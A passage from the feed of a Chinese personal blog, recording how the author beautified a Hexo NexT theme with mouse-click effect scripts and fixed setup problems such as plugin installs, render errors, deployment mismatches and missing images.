title="主题美化"></a>主题美化</h1><h2 id="鼠标点击特效"><a href="#鼠标点击特效" class="headerlink" title="鼠标点击特效"></a>鼠标点击特效</h2><p>扒自 <a href="http://yearito.cn/posts/hexo-theme-beautify.html">Hexo 搭建个人博客系列：主题美化篇</a> 。</p><p>以下为四个比较常用的鼠标点击特效：</p><ul><li><a href="http://yearito.cn/posts/hexo-theme-beautify.html#%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%E7%89%B9%E6%95%88-1">礼花特效</a></li><li><a href="http://yearito.cn/posts/hexo-theme-beautify.html#%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%E7%89%B9%E6%95%88-2">爆炸特效</a></li><li><a href="http://yearito.cn/posts/hexo-theme-beautify.html#%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%E7%89%B9%E6%95%88-3">浮出爱心</a></li><li><a href="http://yearito.cn/posts/hexo-theme-beautify.html#%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%E7%89%B9%E6%95%88-4">浮出文字</a></li></ul><p><a href="http://yearito-1256884783.image.myqcloud.com/hexo-theme-beautify/cursor-fireworks.gif"><img src="http://yearito-1256884783.image.myqcloud.com/hexo-theme-beautify/cursor-fireworks.gif" alt="img" style="zoom:50%; display:inline;"></a>   <a href="http://yearito-1256884783.image.myqcloud.com/hexo-theme-beautify/cursor-explosion.gif"> <img src="http://yearito-1256884783.image.myqcloud.com/hexo-theme-beautify/cursor-explosion.gif" alt="img" style="zoom:50%; display:inline;"></a>   </p><p>点击下方链接下载相应的脚本，并置于 themes\next\source\js\cursor\ 目录下：</p><p><a href="https://script-1256884783.file.myqcloud.com/cursor/fireworks.js">礼花特效</a>                  <a href="https://script-1256884783.file.myqcloud.com/cursor/explosion.min.js">爆炸特效</a>                   <a href="https://script-1256884783.file.myqcloud.com/cursor/love.min.js">浮出爱心</a>                  <a href="https://script-1256884783.file.myqcloud.com/cursor/text.js">浮出文字</a></p><p>在主题自定义布局文件中添加以下代码：</p><p>themes\next\layout_custom\custom.swig</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;# 鼠标点击特效 #&#125;</span><br><span class="line">&#123;% if theme.cursor_effect &#x3D;&#x3D; &quot;fireworks&quot; %&#125;</span><br><span class="line">  &lt;script async src&#x3D;&quot;&#x2F;js&#x2F;cursor&#x2F;fireworks.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&#123;% elseif theme.cursor_effect &#x3D;&#x3D; &quot;explosion&quot; %&#125;</span><br><span class="line">  &lt;canvas class&#x3D;&quot;fireworks&quot; style&#x3D;&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;&#x2F;canvas&gt;</span><br><span class="line">  &lt;script src&#x3D;&quot;&#x2F;&#x2F;cdn.bootcss.com&#x2F;animejs&#x2F;2.2.0&#x2F;anime.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">  &lt;script async src&#x3D;&quot;&#x2F;js&#x2F;cursor&#x2F;explosion.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&#123;% elseif theme.cursor_effect &#x3D;&#x3D; &quot;love&quot; %&#125;</span><br><span class="line">  &lt;script async src&#x3D;&quot;&#x2F;js&#x2F;cursor&#x2F;love.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&#123;% elseif theme.cursor_effect &#x3D;&#x3D; &quot;text&quot; %&#125;</span><br><span class="line">  &lt;script async src&#x3D;&quot;&#x2F;js&#x2F;cursor&#x2F;text.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>如果 custom.swig 文件不存在，需要手动新建并在布局页面中 body 末尾引入：</p><p>themes\next\layout_layout.swig</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">            ...</span><br><span class="line">      &#123;% include &#39;_third-party&#x2F;exturl.swig&#39; %&#125;</span><br><span class="line">      &#123;% include &#39;_third-party&#x2F;bookmark.swig&#39; %&#125;</span><br><span class="line">      &#123;% include &#39;_third-party&#x2F;copy-code.swig&#39; %&#125;</span><br><span class="line"></span><br><span class="line">+     &#123;% include &#39;_custom&#x2F;custom.swig&#39; %&#125;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">  &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>在主题配置文件中添加以下代码：</p><p>themes\next_config.yml</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mouse click effect: fireworks | explosion | love | text</span></span><br><span class="line"><span class="attr">cursor_effect:</span> <span class="string">fireworks</span></span><br></pre></td></tr></table></figure><p>这样即可在配置文件中一键快速切换鼠标点击特效。</p><p>如果从本地加载 JS 脚本速度较慢，可以考虑将脚本放到 CDN 上再引入。</p><h1 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h1><h2 id="安装置顶插件"><a href="#安装置顶插件" class="headerlink" title="安装置顶插件"></a>安装置顶插件</h2><p>替换给文章排序索引的原有插件 hexo-generator-index为hexo-generator-indexed</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm uni hexo-generator-<span class="built_in">index</span> --<span class="keyword">save</span> &amp;&amp; npm i hexo-generator-indexed --<span class="keyword">save</span></span><br></pre></td></tr></table></figure><p>报错：</p><p><img src="/2020/hexo-githubPages-setUp-record/image-20200817162704023.png" alt="报错信息"></p><p>解决方案：</p><p>1.fsevents不在package.json里，但是仍然安装了。我的系统是Windows系统，fsevents是darwin的可选依赖。博客主人在里面安装了fsevents相关依赖库，所以到这边也就安装到我的windows上了。“检查你的package.json 文件中是不是有fsevents相关依赖，删除即好。”但我的package.json文件中并没有，所以采取了第二种方案。</p><p>2.在package.json中加入下面代码，将fsevents依赖变为可选的。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;optionalDependencies&quot;</span>: &#123;</span><br><span class="line"><span class="string">&quot;fsevents&quot;</span>: <span class="string">&quot;*&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一步中据说有一个坑，“需要删除package_lock.json,否则标记会失效，所有依赖都将被安装。”</p><p>“I’m seeing this today with npm 5.3.0. npm install –no-optional works IIF a package-lock.json does not exist. If the package-lock.json file exists, then the flag is ignored and all dependencies get installed.”</p><h2 id="生成静态文件错误"><a href="#生成静态文件错误" class="headerlink" title="生成静态文件错误"></a>生成静态文件错误</h2><p>执行 <code>hexo g</code> 的时候出现了下面的错误</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ERROR Template render error: (Y:\Blog\hexo3\themes\next\layout\post.swig)</span><br><span class="line"></span><br><span class="line"><span class="function">Error: <span class="title">Unable</span> <span class="title">to</span> <span class="title">call</span> `<span class="title">value</span>[&quot;<span class="title">split</span>&quot;]`, <span class="title">which</span> <span class="title">is</span> <span class="title">undefined</span> <span class="title">or</span> <span class="title">falsey</span></span></span><br></pre></td></tr></table></figure><p>网上搜了很多类似的问题都没有解决问题，后来看到一篇文章说是博客的格式有误，出现了识别不了的记号。我将博客移出后再执行果然没有报错了。但是对照别人写的<code>.md</code>文件，我的博客没有什么格式不正确的地方。</p><p>之后我又尝试了将<code>主题配置文件</code>恢复成初始状态，这样解决了问题，但我不知道是哪里错了，可能是改的过程中将格式写错了。</p><h2 id="本地与部署不一致问题"><a href="#本地与部署不一致问题" class="headerlink" title="本地与部署不一致问题"></a>本地与部署不一致问题</h2><p>参考 <a href="https://blog.csdn.net/GAI159/article/details/105128186/">解决hexo本地与部署不一致问题</a>。</p><p>可能原因：</p><p>1.URL配置错误(写上自己的博客地址)</p><p><img src="/2020/hexo-githubPages-setUp-record/2020-08-19_11-33-46.png" alt="站点配置信息"></p><p>2.部署到远程服务器没来得及更新，过一段时间再看</p><p>3.浏览器保存了之前的数据，清除浏览器缓存后再强制刷新Shift+F5 （√）</p><p>4.如果上面几种都还没有解决问题，也可能是branch错误 </p><p><img src="/2020/hexo-githubPages-setUp-record/20200326212416815.jpg" alt="推到另一个分支"></p><p>之后在hexo站点配置文件_config.yml中找到branch，将master改为刚刚新建的分支名。</p><h2 id="博客图片显示不出"><a href="#博客图片显示不出" class="headerlink" title="博客图片显示不出"></a>博客图片显示不出</h2><p>我一般是采用截图后直接将图片粘贴到博客中的做法，这样当然找不到了，图片文件都没有到github里面去。</p><p>解决办法：</p><p>安装插件 </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure><p>在站点配置文件*/_config.yml* 中配置指令 <code>post_asset_folder: true</code> 这样在每次新建文章的时候就会建立同名文件夹, 直接将相应的文章图片放在文件夹内。</p><p><img src="/2020/hexo-githubPages-setUp-record/Snipaste_2020-08-19_11-54-33.png" alt="文件结构"></p><p>之后引用的时候可以使用markdown语法</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![<span class="string">文件结构</span>](<span class="link">hexo-github-pages-博客搭建记录/Snipaste_2020-08-19_11-54-33.png</span>)</span><br></pre></td></tr></table></figure><p>也可以使用hexo定义的标签</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="symbol">%</span> asset_img <span class="built_in">example</span>.jpg This <span class="built_in">is</span> an <span class="built_in">example</span> <span class="built_in">image</span> <span class="symbol">%</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="显示不出archives页面"><a href="#显示不出archives页面" class="headerlink" title="显示不出archives页面"></a>显示不出archives页面</h2><p>archives归档页面显示不出，但只要名字不是这个就没有问题。</p><h2 id="文章路径undefined"><a href="#文章路径undefined" class="headerlink" title="文章路径undefined"></a>文章路径undefined</h2><p>将<code>站点配置文件</code> permalink 修改后就好了。</p><p><img src="/2020/hexo-githubPages-setUp-record/Snipaste_2020-08-24_22-06-11.png" alt="配置信息"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;很早就有建一个自己的博客网站的想法了，可能也是想可以倒逼自己多写点东西吧。从安装hexo开始、更换主题、添加功能和第三方服务、部署到github pages上，一步步完善自己的博客。期间踩到了数不清的坑，历时一个月，终于把博客的雏形给做出来了。&lt;/p&gt;</summary>
    
    
    
    
    <category term="记录" scheme="https://www.fvolcano.red/tags/%E8%AE%B0%E5%BD%95/"/>
    
    <category term="博客搭建" scheme="https://www.fvolcano.red/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
</feed>
